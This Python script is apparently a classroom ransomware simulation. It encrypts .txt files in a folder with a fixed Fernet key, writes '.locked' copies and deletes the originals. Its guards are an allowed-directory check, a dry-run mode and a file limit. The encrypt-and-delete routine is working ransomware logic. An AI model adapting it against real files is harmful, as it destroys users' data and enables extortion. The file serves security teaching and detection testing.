from __future__ import annotations

import argparse
import base64
import os
import time
from pathlib import Path

from cryptography.fernet import Fernet

ALLOWED_TARGET = Path(r"C:\Users\Arnav\Documents\demo_target")


def build_deterministic_key(seed: str) -> bytes:
    raw = seed.encode("utf-8")[:32].ljust(32, b"0")
    return base64.urlsafe_b64encode(raw)


def encrypt_and_lock_file(path: Path, cipher: Fernet, dry_run: bool = False) -> None:
    if dry_run:
        print(f"[DRY-RUN] Would lock: {path}")
        return

    original_data = path.read_bytes()
    encrypted_data = cipher.encrypt(original_data)

    locked_path = path.with_suffix(path.suffix + ".locked")
    locked_path.write_bytes(encrypted_data)
    path.unlink(missing_ok=True)


def iter_txt_files(target_folder: Path):
    for root, _, files in os.walk(target_folder):
        for file_name in files:
            file_path = Path(root) / file_name
            if file_path.suffix.lower() == ".txt":
                yield file_path


def main() -> None:
    parser = argparse.ArgumentParser(description="Simulated ransomware for classroom demo.")
    parser.add_argument("--target", default=r"C:\Users\Public\Documents\demo_target", help="Target folder for .txt files")
    parser.add_argument("--delay", type=float, default=0.25, help="Delay between files (seconds)")
    parser.add_argument("--max-files", type=int, default=0, help="Stop after N files (0 = all files)")
    parser.add_argument("--demo-ransomware", action="store_true", help="Safety marker so detector can identify demo attack process")
    parser.add_argument("--dry-run", action="store_true", help="Simulate the attack without modifying files")
    args = parser.parse_args()

    target_path = Path(args.target).resolve()
    if not target_path.exists():
        print(f"Target folder does not exist: {target_path}")
        return

    if not target_path.is_relative_to(ALLOWED_TARGET):
        print(f"Error: Target folder {target_path} is outside the allowed directory {ALLOWED_TARGET}")
        return

    key = build_deterministic_key("EH-DEMO-KEY")
    cipher = Fernet(key)

    processed = 0
    print(f"[mock_attack] Starting simulation in {target_path}")
    for txt_file in iter_txt_files(target_path):
        encrypt_and_lock_file(txt_file, cipher, dry_run=args.dry_run)
        processed += 1
        print(f"[mock_attack] locked: {txt_file}")

        if args.max_files > 0 and processed >= args.max_files:
            break
        time.sleep(max(args.delay, 0.0))

    print(f"[mock_attack] Finished. Files processed: {processed}")


if __name__ == "__main__":
    main()
